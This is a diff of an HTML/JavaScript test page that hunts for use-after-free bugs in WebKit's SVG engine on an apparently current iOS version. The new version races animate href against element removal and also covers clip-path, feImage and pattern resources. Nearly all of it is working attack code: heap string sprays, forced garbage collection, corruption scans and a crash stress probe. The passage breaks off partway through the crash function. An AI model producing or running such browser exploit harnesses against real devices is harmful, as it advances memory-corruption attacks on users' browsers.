@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG use UAF v1 · clone lifecycle probe</title>
+<title>SVG animate UAF v2 · mid-animation href timing</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,59 +17,62 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG &lt;use&gt; clone UAF v1 · WebKit iOS 26.5.2</h2>
+<h2>SVG animate UAF v2 · mid-animation href timing · iOS 26.5.2</h2>
 <div class="sub">
-  Target: SVG &lt;use href="#sym"&gt; clones shadow tree of &lt;symbol id="sym"&gt;.<br>
-  Remove + GC symbol while &lt;use&gt; clone still in render tree.<br>
-  WebKit's RenderSVGResourceContainer* in clone may point to freed original.<br>
-  Force repaint/style recalc → UAF read during render tree walk.
+  Target: SVGAnimateElement animating href="#sym" while sym is removed mid-animation.<br>
+  Animation engine holds raw resource ptr during frame resolution.<br>
+  If invalidation notification fires AFTER animation reads the ptr → UAF read.<br>
+  Also: CSS clip-path url(#id) + feImage href paths tested in parallel.
 </div>
 <div id="controls">
   <button onclick="runDIAG()">DIAG</button>
-  <button onclick="runS1()">S1 basic GC</button>
-  <button onclick="runS2()">S2 repaint deref</button>
-  <button onclick="runS3()">S3 getBBox UAF</button>
-  <button onclick="runS4()">S4 clone stress</button>
+  <button onclick="runA1()">A1 animate-href</button>
+  <button onclick="runA2()">A2 animate-timing</button>
+  <button onclick="runA3()">A3 clip-path UAF</button>
+  <button onclick="runA4()">A4 feImage UAF</button>
+  <button onclick="runA5()">A5 pattern UAF</button>
   <button onclick="runCRASH()">CRASH</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
 </div>
-<!-- Hidden SVG canvas -->
 <svg id="canvas" width="1" height="1" style="position:absolute;left:-9999px"></svg>
 <div id="log"></div>
 <script>
 /*
- * ATTACK MODEL: SVG <use> element clone UAF
+ * ATTACK MODEL v2: SVGAnimateElement mid-animation href UAF
  *
- * WebKit SVG architecture:
- *   <symbol id="sym">   → SVGSymbolElement → RenderSVGResourceContainer
- *   <use href="#sym">   → SVGUseElement → creates shadow clone tree
- *                          shadow clone holds pointer back to original
- *                          via SVGUseElement::m_targetElementInstance
- *                          and RenderSVGResourceContainer tracking
+ * WebKit SVG animation architecture:
+ *   <animate attributeName="href" values="#sym1;#sym2" dur="1s">
+ *   → SMILTimeContainer ticks → SVGAnimateElement::applyResultsToTarget()
+ *   → resolves href string → looks up element by id
+ *   → stores resolved SVGElement* in animation value cache
+ *   → on next tick: reads cached ptr to compute interpolation
  *
- * UAF path:
- *   1. symbol exists → use clones it → render tree built
- *   2. symbol.remove() → null all JS refs → GC pressure
- *   3. RenderSVGResourceContainer for symbol freed
- *   4. use element still in DOM → render tree still references freed container
- *   5. Force repaint: getBBox(), getComputedStyle(), style mutation
- *      → WebKit walks render tree → reads freed RenderSVGResourceContainer*
- *      → UAF read → potential crash or info leak
+ * UAF window:
+ *   Tick N:   animate resolves "#sym1" → stores SVGElement* ptr in cache
+ *   Between:  sym1.remove() + GC → sym1 freed
+ *   Tick N+1: animate reads CACHED ptr for interpolation → UAF read
+ *
+ * Key: the invalidation (notifyResourceClients) fires on DOM removal,
+ * but the animation cache may hold the resolved ptr separately from
+ * the resource tracking system. These are TWO different subsystems:
+ *   1. SVGDocumentExtensions resource tracking (what svg_v1 tested — patched)
+ *   2. SVGAnimationElement value cache (separate — potentially unpatched)
+ *
+ * ALSO TESTING:
+ *   A3: CSS clip-path: url(#clip) — layout engine resolves clip separately
+ *   A4: feImage href — filter pipeline holds its own resource ref
+ *   A5: SVGPatternElement fill="url(#pat)" — pattern resource tracking
  *
  * DETECTION:
- *   - getBBox() throwing = render tree corruption
- *   - getComputedStyle() returning garbled values = OOB read
- *   - String spray: corrupted StringImpl = UAF write
+ *   - Exception during animation = render tree crash → UAF
+ *   - String spray corruption = UAF write
+ *   - getBBox returning non-zero garbage after GC = OOB read from freed mem
  *   - Tab crash = full UAF confirmed
- *
- * NOTE: SVG <use> was a major UAF source historically:
- *   CVE-2023-32409, CVE-2022-32893, CVE-2021-30858 all SVG-related
- *   The clone shadow tree + resource container pattern is well-known
- *   but new variants keep appearing on each WebKit version.
  */
 
+const SVG_NS='http://www.w3.org/2000/svg';
 const Lel=document.getElementById('log');
 function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';Lel.appendChild(s);Lel.scrollTop=Lel.scrollHeight;}
 const sep=()=>log('─'.repeat(52),'sep');
@@ -81,11 +84,8 @@ function dis(d){document.querySelectorAll('button').forEach(b=>{if(!b.onclick?.t
 window.onerror=(m,_,l,c)=>{log(`[CRASH] ${m} L${l}:${c}`,'bad');return false;};
 window.onunhandledrejection=e=>{log(`[CRASH/rej] ${e.reason}`,'bad');};
 
-const SVG_NS='http://www.w3.org/2000/svg';
-
-// ── helpers ──────────────────────────────────────────────────────────
 function sprayStrs(n){const a=[];for(let i=0;i<n;i++)a.push('A'.repeat(104));return a;}
-function scanStrs(strs,lbl,cap=32){
+function scanStrs(strs,lbl,cap=16){
     let hits=0;
     for(let i=0;i<strs.length&&hits<cap;i++){
         const s=strs[i];if(!s)continue;
@@ -101,326 +101,448 @@ async function gcP(mb=20){
     for(let i=0;i<N;i++){s.push(new ArrayBuffer(C));if(i%32===31)await yield_();}
     s.length=0;await yield_();
 }
-function mkSVG(){
-    // create a fresh SVG container in the document
+function mkSVGContainer(){
     const svg=document.createElementNS(SVG_NS,'svg');
-    svg.setAttribute('width','100');svg.setAttribute('height','100');
-    svg.style.cssText='position:absolute;left:-9999px;top:-9999px';
+    svg.setAttribute('width','200');svg.setAttribute('height','200');
+    svg.style.cssText='position:fixed;left:0;top:0;width:1px;height:1px;opacity:0.01';
     document.body.appendChild(svg);
     return svg;
 }
-function mkSymbol(id,childCount=4){
+function mkSymbol(id,n=4){
     const sym=document.createElementNS(SVG_NS,'symbol');
     sym.setAttribute('id',id);
     sym.setAttribute('viewBox','0 0 100 100');
-    for(let i=0;i<childCount;i++){
+    for(let i=0;i<n;i++){
         const r=document.createElementNS(SVG_NS,'rect');
-        r.setAttribute('x',String(i*10));r.setAttribute('y','10');
-        r.setAttribute('width','8');r.setAttribute('height','8');
-        r.setAttribute('fill','red');
+        r.setAttribute('x',String(i*20));r.setAttribute('y','10');
+        r.setAttribute('width','15');r.setAttribute('height','15');
+        r.setAttribute('fill',`hsl(${i*60},80%,50%)`);
         sym.appendChild(r);
     }
     return sym;
 }
-function mkUse(href,svg){
-    const u=document.createElementNS(SVG_NS,'use');
-    u.setAttribute('href',`#${href}`);
-    u.setAttribute('x','0');u.setAttribute('y','0');
-    svg.appendChild(u);
-    return u;
-}
 
-// ── DIAG: confirm <use> clone works and GC fires ──────────────────────
+// ── DIAG: confirm animate element works and GC fires ──────────────────
 async function runDIAG(q=false){
-    if(!q){dis(true);sep();log('▶ DIAG: SVG use clone + GC confirmation','inf');sep();}
-    if(typeof FinalizationRegistry==='undefined'){log('[-] FinalizationRegistry unavailable','bad');if(!q)dis(false);return;}
+    if(!q){dis(true);sep();log('▶ DIAG: SVGAnimate + GC confirmation','inf');sep();}
     let gcCount=0;
+    if(typeof FinalizationRegistry==='undefined'){log('[-] no FinalizationRegistry','bad');if(!q)dis(false);return;}
     const reg=new FinalizationRegistry(()=>gcCount++);
     for(let t=0;t<5;t++){
-        const svg=mkSVG();
-        let sym=mkSymbol(`diag_sym_${t}`,4);
-        svg.appendChild(sym);
-        const useEl=mkUse(`diag_sym_${t}`,svg);
+        const svg=mkSVGContainer();
+        let sym1=mkSymbol(`da_s1_${t}`,4);
+        let sym2=mkSymbol(`da_s2_${t}`,4);
+        svg.appendChild(sym1);svg.appendChild(sym2);
+        // create use with animate
+        const useEl=document.createElementNS(SVG_NS,'use');
+        useEl.setAttribute('href',`#da_s1_${t}`);
+        const anim=document.createElementNS(SVG_NS,'animate');
+        anim.setAttribute('attributeName','href');
+        anim.setAttribute('values',`#da_s1_${t};#da_s2_${t}`);
+        anim.setAttribute('dur','2s');
+        anim.setAttribute('repeatCount','indefinite');
+        useEl.appendChild(anim);
+        svg.appendChild(useEl);
         await yield_();
-        // Verify clone works
-        let bboxOk=false;
-        try{const bb=useEl.getBBox();bboxOk=bb.width>0||bb.height>0||true;log(`  t${t}: getBBox=${JSON.stringify({w:bb.width.toFixed(1),h:bb.height.toFixed(1),x:bb.x.toFixed(1),y:bb.y.toFixed(1)})}`,'dim');}
-        catch(e){log(`  t${t}: getBBox threw: ${e}`,'inf');}
-        // Register symbol for GC tracking
-        reg.register(sym,`sym_${t}`);
-        // Remove symbol + null ref
-        sym.remove();sym=null;
-        // GC pressure
-        await gcP(20);
+        reg.register(sym1,`sym1_${t}`);
+        // let animation tick a few times
+        await sleep(50);
+        // remove sym1 while animation still running
+        sym1.remove();sym1=null;
+        await gcP(15);
         await yield_();
-        log(`  t${t}: gcCount=${gcCount} useEl still in DOM=${useEl.isConnected}`,'dim');
-        // Try to use the use element after symbol is gone
-        try{
-            const bb=useEl.getBBox();
-            log(`  t${t}: post-GC getBBox=${JSON.stringify({w:bb.width.toFixed(1),h:bb.height.toFixed(1)})}`,(bboxOk?'dim':'inf'));
-        }catch(e){log(`  t${t}: post-GC getBBox threw: ${e}`,'hi');}
+        log(`  t${t}: gcCount=${gcCount} anim still running=${anim.isConnected}`,'dim');
+        // force a layout query during animation with freed sym1
+        let exc=null;
+        try{const bb=useEl.getBBox();log(`  t${t}: getBBox post-GC: w=${bb.width.toFixed(2)} h=${bb.height.toFixed(2)}`,bb.width!==0||bb.height!==0?'hi':'dim');}
+        catch(e){log(`  t${t}: getBBox threw: ${e}`,'hi');exc=e;}
         svg.remove();await yield_();
     }
-    log(`[diag] total GC collected: ${gcCount}/5`,(gcCount>0?'ok':'inf'));
-    if(gcCount===0) log('[!] symbol never GC\'d — SVG element may be kept alive by render tree ref','inf');
+    log(`[diag] gcCount=${gcCount}/5`,(gcCount>0?'ok':'inf'));
     if(!q)dis(false);
 }
 
-// ── S1: Basic GC + use element ────────────────────────────────────────
-async function runS1(q=false){
-    if(!q){dis(true);sep();log('▶ S1: symbol remove + GC, use element deref','inf');sep();}
+// ── A1: animate href from sym1 to sym2, remove sym1 mid-animation ─────
+// Core test: animation value cache holds SVGElement* after DOM removal
+async function runA1(q=false){
+    if(!q){dis(true);sep();log('▶ A1: animate href mid-remove — animation value cache UAF','inf');sep();}
     let found=false;
-    for(let t=0;t<12;t++){
-        const svg=mkSVG();
-        let sym=mkSymbol(`s1_${t}`,8);
-        svg.appendChild(sym);
-        const useEl=mkUse(`s1_${t}`,svg);
-        await yield_();
-        const pre=sprayStrs(512);for(let i=0;i<512;i+=2)pre[i]=null;
-        // Remove symbol
-        sym.remove();sym=null;
+    for(let t=0;t<16;t++){
+        const svg=mkSVGContainer();
+        let sym1=mkSymbol(`a1_s1_${t}`,6);
+        let sym2=mkSymbol(`a1_s2_${t}`,6);
+        svg.appendChild(sym1);svg.appendChild(sym2);
+        const useEl=document.createElementNS(SVG_NS,'use');
+        useEl.setAttribute('href',`#a1_s1_${t}`);
+        const anim=document.createElementNS(SVG_NS,'animate');
+        anim.setAttribute('attributeName','href');
+        anim.setAttribute('values',`#a1_s1_${t};#a1_s2_${t}`);
+        anim.setAttribute('dur','0.1s'); // fast — so cache is hot
+        anim.setAttribute('repeatCount','indefinite');
+        useEl.appendChild(anim);
+        svg.appendChild(useEl);
+        // let animation start and cache sym1 ptr
+        await sleep(30);
+        const pre=sprayStrs(256);for(let i=0;i<256;i+=2)pre[i]=null;
+        // remove sym1 WHILE animation is running (mid-animation)
+        sym1.remove();sym1=null;
+        // immediately spray — race window is tiny
         const post=sprayStrs(256);
-        // GC
+        // GC to free sym1
         await gcP(20);
-        const post2=sprayStrs(256);
+        const post2=sprayStrs(128);
+        // force animation to tick again with freed sym1 in cache
+        // getBBox forces synchronous layout which triggers animation resolution
         let exc=null;
-        // Force render tree walk on the use element with freed symbol
         try{
-            // getBBox forces layout + render tree traversal
-            const bb=useEl.getBBox();
-            log(`  t${t}: getBBox survived w=${bb.width.toFixed(1)}`,'dim');
-        }catch(e){log(`  [HIT] S1 getBBox t${t}: ${e}`,'hi');exc=e;}
-        try{
-            // getComputedStyle forces style resolution
-            const cs=window.getComputedStyle(useEl);
-            void cs.display;void cs.visibility;
-        }catch(e){log(`  [HIT] S1 computedStyle t${t}: ${e}`,'hi');exc=e;}
-        try{
-            // Force repaint by mutating a style prop
-            useEl.style.opacity='0.99';
-            void useEl.offsetHeight; // force sync layout
-            useEl.style.opacity='';
-        }catch(e){log(`  [HIT] S1 repaint t${t}: ${e}`,'hi');exc=e;}
-        const h=scanStrs([...pre.filter(s=>s),...post,...post2],`S1_t${t}`);
-        if(h>0||exc){log(`  [+] S1 hit t${t}`,'ok');found=true;}
-        svg.remove();await yield_();
-    }
-    if(!found)log('[-] S1: no corruption — render tree may hold strong ref to symbol','bad');
-    else log('[+] S1: HIT','ok');
-    if(!q)dis(false);return found;
-}
-
-// ── S2: Repaint deref after symbol removed ────────────────────────────
-// More aggressive: remove symbol, spray, force paint via rAF
-async function runS2(q=false){
-    if(!q){dis(true);sep();log('▶ S2: repaint deref via rAF after symbol GC','inf');sep();}
-    let found=false;
-    for(let t=0;t<8;t++){
-        const svg=mkSVG();
-        svg.style.display='block'; // make it visible so it actually paints
-        svg.style.position='fixed';
-        svg.style.left='0';svg.style.top='0';
-        svg.style.width='1px';svg.style.height='1px';
-        svg.style.opacity='0.01';
-        let sym=mkSymbol(`s2_${t}`,6);
-        svg.appendChild(sym);
-        const useEl=mkUse(`s2_${t}`,svg);
-        await yield_();
-        await new Promise(r=>requestAnimationFrame(r)); // let first paint happen
-        const pre=sprayStrs(512);for(let i=0;i<512;i+=2)pre[i]=null;
-        sym.remove();sym=null;
-        const post=sprayStrs(256);
-        await gcP(20);
-        let exc=null;
-        // Force repaint via rAF — WebKit must repaint <use> with freed symbol
-        await new Promise(resolve=>{
-            requestAnimationFrame(()=>{
-                const s=sprayStrs(256);
-                try{
-                    // Force layout queries during the paint frame
-                    void useEl.getBoundingClientRect();
-                    void useEl.getBBox();
-                }catch(e){log(`  [HIT] S2 rAF t${t}: ${e}`,'hi');exc=e;}
-                s.length=0;
-                resolve();
-            });
-        });
-        const post2=sprayStrs(256);
-        await yield_();
-        const h=scanStrs([...pre.filter(s=>s),...post,...post2],`S2_t${t}`);
-        if(h>0||exc){log(`  [+] S2 hit t${t}`,'ok');found=true;}
+            // Force multiple layout queries to increase chance of hitting freed ptr
+            for(let i=0;i<5;i++){
+                const bb=useEl.getBBox();
+                if(bb.width!==0||bb.height!==0){
+                    log(`  [HIT?] A1 t${t} non-zero bbox after GC: w=${bb.width} h=${bb.height}`,'hi');
+                    exc='nonzero_bbox';break;
+                }
+                await yield_();
+            }
+        }catch(e){log(`  [HIT] A1 t${t} exception: ${e}`,'hi');exc=e;}
+        const h=scanStrs([...pre.filter(s=>s),...post,...post2],`A1_t${t}`);
+        if(h>0||exc){log(`  [+] A1 hit t${t}`,'ok');found=true;}
         else log(`  t${t}: survived`,'dim');
         svg.remove();await yield_();
     }
-    if(!found)log('[-] S2: no rAF repaint corruption','bad');else log('[+] S2: HIT','ok');
+    if(!found)log('[-] A1: no animation cache UAF — WebKit invalidates anim cache on removal','bad');
+    else log('[+] A1: HIT','ok');
     if(!q)dis(false);return found;
 }
 
-// ── S3: getBBox() + nested <use> chain ───────────────────────────────
-// <use> referencing another <use> referencing the symbol
-// deeper clone chain = more render tree nodes holding stale ptr
-async function runS3(q=false){
-    if(!q){dis(true);sep();log('▶ S3: nested use chain + getBBox UAF','inf');sep();}
+// ── A2: animate with begin="indefinite", manually begin mid-removal ───
+// Different code path: beginElement() forces sync resolution of current href
+async function runA2(q=false){
+    if(!q){dis(true);sep();log('▶ A2: beginElement() mid-removal — sync resolution timing','inf');sep();}
     let found=false;
-    for(let t=0;t<8;t++){
-        const svg=mkSVG();
-        let sym=mkSymbol(`s3_${t}`,4);
-        svg.appendChild(sym);
-        // chain: use1 → use2 → sym
-        const use1=mkUse(`s3_${t}`,svg);
-        // use2 references use1's output (clone of clone)
-        // Actually reference the symbol twice via two separate <use> elements
-        const use2=mkUse(`s3_${t}`,svg);
-        const use3=mkUse(`s3_${t}`,svg);
+    for(let t=0;t<16;t++){
+        const svg=mkSVGContainer();
+        let sym1=mkSymbol(`a2_s1_${t}`,4);
+        let sym2=mkSymbol(`a2_s2_${t}`,4);
+        svg.appendChild(sym1);svg.appendChild(sym2);
+        const useEl=document.createElementNS(SVG_NS,'use');
+        useEl.setAttribute('href',`#a2_s1_${t}`);
+        const anim=document.createElementNS(SVG_NS,'animate');
+        anim.setAttribute('attributeName','href');
+        anim.setAttribute('values',`#a2_s1_${t};#a2_s2_${t}`);
+        anim.setAttribute('dur','0.5s');
+        anim.setAttribute('begin','indefinite'); // manual trigger
+        useEl.appendChild(anim);
+        svg.appendChild(useEl);
         await yield_();
-        const pre=sprayStrs(512);for(let i=0;i<512;i+=2)pre[i]=null;
-        sym.remove();sym=null;
-        const post=sprayStrs(512);
-        await gcP(25);
+        const pre=sprayStrs(256);for(let i=0;i<256;i+=2)pre[i]=null;
+        // remove sym1
+        sym1.remove();sym1=null;
+        const post=sprayStrs(256);
+        await gcP(20);
+        // NOW force animation to begin — it must resolve href values NOW
+        // sym1 is already freed — if it reads the cached/resolved sym1 ptr → UAF
         let exc=null;
-        // Force getBBox on all three use elements
-        for(const [i,u] of [[0,use1],[1,use2],[2,use3]]){
-            try{
-                const bb=u.getBBox();
-                void bb.width;
-            }catch(e){log(`  [HIT] S3 use${i} getBBox t${t}: ${e}`,'hi');exc=e;}
-        }
-        // Force style recalc on all
         try{
-            svg.querySelectorAll('use').forEach(u=>{
-                u.style.transform='translateX(0)';
-                void u.offsetWidth;
-            });
-        }catch(e){log(`  [HIT] S3 querySelectorAll t${t}: ${e}`,'hi');exc=e;}
-        const h=scanStrs([...pre.filter(s=>s),...post],`S3_t${t}`);
-        if(h>0||exc){log(`  [+] S3 hit t${t}`,'ok');found=true;}
-        else log(`  t${t}: 3x use survived`,'dim');
+            anim.beginElement(); // force sync start
+            await yield_();
+            const bb=useEl.getBBox();
+            if(bb.width!==0||bb.height!==0){
+                log(`  [HIT?] A2 t${t} non-zero bbox: w=${bb.width} h=${bb.height}`,'hi');
+                exc='nonzero_bbox';
+            }
+        }catch(e){log(`  [HIT] A2 t${t}: ${e}`,'hi');exc=e;}
+        const h=scanStrs([...pre.filter(s=>s),...post],`A2_t${t}`);
+        if(h>0||exc){log(`  [+] A2 hit t${t}`,'ok');found=true;}
+        else log(`  t${t}: survived`,'dim');
         svg.remove();await yield_();
     }
-    if(!found)log('[-] S3: no nested-use corruption','bad');else log('[+] S3: HIT','ok');
+    if(!found)log('[-] A2: no beginElement timing UAF','bad');
+    else log('[+] A2: HIT','ok');
     if(!q)dis(false);return found;
 }
 
-// ── S4: Clone stress — 100 use elements, 1 symbol, mass GC ──────────
-async function runS4(q=false){
-    if(!q){dis(true);sep();log('▶ S4: 100 <use> elements referencing 1 symbol → GC symbol','inf');sep();}
+// ── A3: CSS clip-path: url(#clip) UAF ────────────────────────────────
+// Layout engine resolves clip-path SEPARATELY from SVGUseElement resource tracking
+// May not share the same invalidation path
+async function runA3(q=false){
+    if(!q){dis(true);sep();log('▶ A3: CSS clip-path url(#clip) + GC → layout UAF','inf');sep();}
     let found=false;
-    for(let t=0;t<4;t++){
-        const svg=mkSVG();
-        let sym=mkSymbol(`s4_${t}`,8);
-        svg.appendChild(sym);
-        const uses=[];
-        for(let i=0;i<100;i++) uses.push(mkUse(`s4_${t}`,svg));
+    for(let t=0;t<12;t++){
+        const svg=mkSVGContainer();
+        // create clipPath element
+        let clip=document.createElementNS(SVG_NS,'clipPath');
+        clip.setAttribute('id',`a3_clip_${t}`);
+        const cr=document.createElementNS(SVG_NS,'circle');
+        cr.setAttribute('cx','50');cr.setAttribute('cy','50');cr.setAttribute('r','40');
+        clip.appendChild(cr);
+        svg.appendChild(clip);
+        // create element using the clip
+        const rect=document.createElementNS(SVG_NS,'rect');
+        rect.setAttribute('x','0');rect.setAttribute('y','0');
+        rect.setAttribute('width','100');rect.setAttribute('height','100');
+        rect.setAttribute('fill','red');
+        rect.setAttribute('clip-path',`url(#a3_clip_${t})`);
+        svg.appendChild(rect);
         await yield_();
-        const pre=sprayStrs(512);for(let i=0;i<512;i+=2)pre[i]=null;
-        sym.remove();sym=null;
-        const post=sprayStrs(512);
-        await gcP(30);
-        let exc=null,hits=0;
-        // Force getBBox on all 100 use elements
-        for(let i=0;i<uses.length;i++){
-            try{
-                const bb=uses[i].getBBox();
-                void bb.x;
-            }catch(e){
-                if(hits<3)log(`  [HIT] S4 use[${i}] t${t}: ${e}`,'hi');
-                exc=e;hits++;
-            }
-        }
-        log(`  t${t}: 100 use getBBox: ${hits} exceptions`,(hits>0?'ok':'dim'));
-        const h=scanStrs([...pre.filter(s=>s),...post],`S4_t${t}`);
-        if(h>0||exc){log(`  [+] S4 hit t${t}`,'ok');found=true;}
+        const pre=sprayStrs(256);for(let i=0;i<256;i+=2)pre[i]=null;
+        // remove clipPath — layout engine still has url(#a3_clip_N) reference
+        clip.remove();clip=null;
+        const post=sprayStrs(256);
+        await gcP(20);
+        // force layout with freed clipPath
+        let exc=null;
+        try{
+            void rect.getBoundingClientRect();
+            const bb=rect.getBBox();
+            // check if clipping still being applied (means stale ptr read)
+            void window.getComputedStyle(rect).clipPath;
+        }catch(e){log(`  [HIT] A3 t${t}: ${e}`,'hi');exc=e;}
+        // force repaint
+        try{
+            rect.style.transform='translateX(0.001px)';
+            void rect.offsetWidth;
+            rect.style.transform='';
+        }catch(e){log(`  [HIT] A3 repaint t${t}: ${e}`,'hi');exc=e;}
+        const h=scanStrs([...pre.filter(s=>s),...post],`A3_t${t}`);
+        if(h>0||exc){log(`  [+] A3 hit t${t}`,'ok');found=true;}
+        else log(`  t${t}: clip-path survived`,'dim');
         svg.remove();await yield_();
     }
-    if(!found)log('[-] S4: no mass-clone corruption','bad');else log('[+] S4: HIT','ok');
+    if(!found)log('[-] A3: no clip-path UAF — layout engine clears ref on element removal','bad');
+    else log('[+] A3: HIT','ok');
+    if(!q)dis(false);return found;
+}
+
+// ── A4: feImage href UAF ──────────────────────────────────────────────
+// SVGFEImageElement holds its own href resource reference
+// Filter pipeline: separate code path from use element + clip-path
+async function runA4(q=false){
+    if(!q){dis(true);sep();log('▶ A4: feImage href removed element + force filter eval UAF','inf');sep();}
+    let found=false;
+    for(let t=0;t<12;t++){
+        const svg=mkSVGContainer();
+        // target element that feImage will reference
+        let target=mkSymbol(`a4_tgt_${t}`,4);
+        svg.appendChild(target);
+        // build filter with feImage referencing target
+        const filter=document.createElementNS(SVG_NS,'filter');
+        filter.setAttribute('id',`a4_filt_${t}`);
+        const feImg=document.createElementNS(SVG_NS,'feImage');
+        feImg.setAttribute('href',`#a4_tgt_${t}`);
+        feImg.setAttribute('result','src');
+        filter.appendChild(feImg);
+        svg.appendChild(filter);
+        // element with filter applied
+        const rect=document.createElementNS(SVG_NS,'rect');
+        rect.setAttribute('x','0');rect.setAttribute('y','0');
+        rect.setAttribute('width','100');rect.setAttribute('height','100');
+        rect.setAttribute('filter',`url(#a4_filt_${t})`);
+        svg.appendChild(rect);
+        await yield_();
+        await new Promise(r=>requestAnimationFrame(r)); // let first paint run
+        const pre=sprayStrs(256);for(let i=0;i<256;i+=2)pre[i]=null;
+        // remove target — feImage still has href pointing to freed element
+        target.remove();target=null;
+        const post=sprayStrs(256);
+        await gcP(20);
+        // force filter re-evaluation by causing a repaint
+        let exc=null;
+        try{
+            rect.style.opacity='0.99';
+            void rect.offsetHeight;
+            rect.style.opacity='';
+            await new Promise(r=>requestAnimationFrame(r));
+            void rect.getBoundingClientRect();
+        }catch(e){log(`  [HIT] A4 t${t}: ${e}`,'hi');exc=e;}
+        const h=scanStrs([...pre.filter(s=>s),...post],`A4_t${t}`);
+        if(h>0||exc){log(`  [+] A4 hit t${t}`,'ok');found=true;}
+        else log(`  t${t}: feImage survived`,'dim');
+        svg.remove();await yield_();
+    }
+    if(!found)log('[-] A4: no feImage UAF — filter pipeline clears ref correctly','bad');
+    else log('[+] A4: HIT','ok');
+    if(!q)dis(false);return found;
+}
+
+// ── A5: SVGPatternElement fill="url(#pat)" UAF ────────────────────────
+// Pattern resource tracking is a third separate system
+// fill="url(#pat)" → RenderSVGResourcePattern → holds SVGPatternElement*
+async function runA5(q=false){
+    if(!q){dis(true);sep();log('▶ A5: SVGPattern fill removed + GC → render UAF','inf');sep();}
+    let found=false;
+    for(let t=0;t<12;t++){
+        const svg=mkSVGContainer();
+        // create pattern
+        let pat=document.createElementNS(SVG_NS,'pattern');
+        pat.setAttribute('id',`a5_pat_${t}`);
+        pat.setAttribute('x','0');pat.setAttribute('y','0');
+        pat.setAttribute('width','20');pat.setAttribute('height','20');
+        pat.setAttribute('patternUnits','userSpaceOnUse');
+        const pr=document.createElementNS(SVG_NS,'rect');
+        pr.setAttribute('width','10');pr.setAttribute('height','10');
+        pr.setAttribute('fill','blue');
+        pat.appendChild(pr);
+        svg.appendChild(pat);
+        // element using the pattern as fill
+        const rect=document.createElementNS(SVG_NS,'rect');
+        rect.setAttribute('x','0');rect.setAttribute('y','0');
+        rect.setAttribute('width','100');rect.setAttribute('height','100');
+        rect.setAttribute('fill',`url(#a5_pat_${t})`);
+        svg.appendChild(rect);
+        await yield_();
+        await new Promise(r=>requestAnimationFrame(r));
+        const pre=sprayStrs(256);for(let i=0;i<256;i+=2)pre[i]=null;
+        pat.remove();pat=null;
+        const post=sprayStrs(256);
+        await gcP(20);
+        let exc=null;
+        try{
+            // force repaint — render must resolve fill="url(...)" → freed pattern
+            rect.style.transform='scale(1.0001)';
+            void rect.offsetWidth;
+            rect.style.transform='';
+            await new Promise(r=>requestAnimationFrame(r));
+        }catch(e){log(`  [HIT] A5 t${t}: ${e}`,'hi');exc=e;}
+        const h=scanStrs([...pre.filter(s=>s),...post],`A5_t${t}`);
+        if(h>0||exc){log(`  [+] A5 hit t${t}`,'ok');found=true;}
+        else log(`  t${t}: pattern survived`,'dim');
+        svg.remove();await yield_();
+    }
+    if(!found)log('[-] A5: no pattern UAF — RenderSVGResourcePattern clears ref correctly','bad');
+    else log('[+] A5: HIT','ok');
     if(!q)dis(false);return found;
 }
 
 // ── CRASH PROBE ────────────────────────────────────────────────────────
 async function runCRASH(){
-    sep();log('▶ CRASH PROBE: SVG use UAF max stress','bad');sep();
-    await sleep(500);
+    sep();log('▶ CRASH PROBE: max stress all SVG resource paths simultaneously','bad');sep();
+    await sleep(300);
     const mega=sprayStrs(2048);for(let i=0;i<2048;i+=2)mega[i]=null;
-    await gcP(15);log('[*] pre-spray + GC done','dim');
+    await gcP(20);log('[*] initial spray+GC done','dim');
     let gcCount=0;
     if(typeof FinalizationRegistry!=='undefined'){
         const reg=new FinalizationRegistry(()=>gcCount++);
-        // Create 20 svgs each with 1 symbol + 50 use elements
-        const svgs=[];
-        for(let i=0;i<20;i++){
-            const svg=mkSVG();
-            let sym=mkSymbol(`crash_${i}`,8);
-            svg.appendChild(sym);
-            for(let j=0;j<50;j++) mkUse(`crash_${i}`,svg);
-            reg.register(sym,`sym_${i}`);
-            sym.remove();sym=null;
-            svgs.push(svg);
+        const containers=[];
+        // spawn 15 of each type simultaneously
+        for(let i=0;i<15;i++){
+            // animate type
+            const svgA=mkSVGContainer();
+            let symA1=mkSymbol(`cr_a1_${i}`,6);let symA2=mkSymbol(`cr_a2_${i}`,6);
+            svgA.appendChild(symA1);svgA.appendChild(symA2);
+            const uA=document.createElementNS(SVG_NS,'use');uA.setAttribute('href',`#cr_a1_${i}`);
+            const anA=document.createElementNS(SVG_NS,'animate');
+            anA.setAttribute('attributeName','href');anA.setAttribute('values',`#cr_a1_${i};#cr_a2_${i}`);
+            anA.setAttribute('dur','0.05s');anA.setAttribute('repeatCount','indefinite');
+            uA.appendChild(anA);svgA.appendChild(uA);
+            reg.register(symA1,`cr_sym_${i}`);
+            containers.push({svg:svgA,sym:symA1,el:uA,type:'animate'});
+            symA1=null;
+
+            // clip-path type
+            const svgC=mkSVGContainer();
+            let clipC=document.createElementNS(SVG_NS,'clipPath');
+            clipC.setAttribute('id',`cr_clip_${i}`);
+            const cc=document.createElementNS(SVG_NS,'circle');cc.setAttribute('cx','50');cc.setAttribute('cy','50');cc.setAttribute('r','40');
+            clipC.appendChild(cc);svgC.appendChild(clipC);
+            const rC=document.createElementNS(SVG_NS,'rect');rC.setAttribute('x','0');rC.setAttribute('y','0');rC.setAttribute('width','100');rC.setAttribute('height','100');rC.setAttribute('clip-path',`url(#cr_clip_${i})`);
+            svgC.appendChild(rC);
+            containers.push({svg:svgC,sym:clipC,el:rC,type:'clip'});
+            clipC=null;
+
+            // pattern type
+            const svgP=mkSVGContainer();
+            let patP=document.createElementNS(SVG_NS,'pattern');patP.setAttribute('id',`cr_pat_${i}`);
+            patP.setAttribute('width','20');patP.setAttribute('height','20');patP.setAttribute('patternUnits','userSpaceOnUse');
+            const pr=document.createElementNS(SVG_NS,'rect');pr.setAttribute('width','10');pr.setAttribute('height','10');pr.setAttribute('fill','red');
+            patP.appendChild(pr);svgP.appendChild(patP);
+            const rP=document.createElementNS(SVG_NS,'rect');rP.setAttribute('x','0');rP.setAttribute('y','0');rP.setAttribute('width','100');rP.setAttribute('height','100');rP.setAttribute('fill',`url(#cr_pat_${i})`);
+            svgP.appendChild(rP);
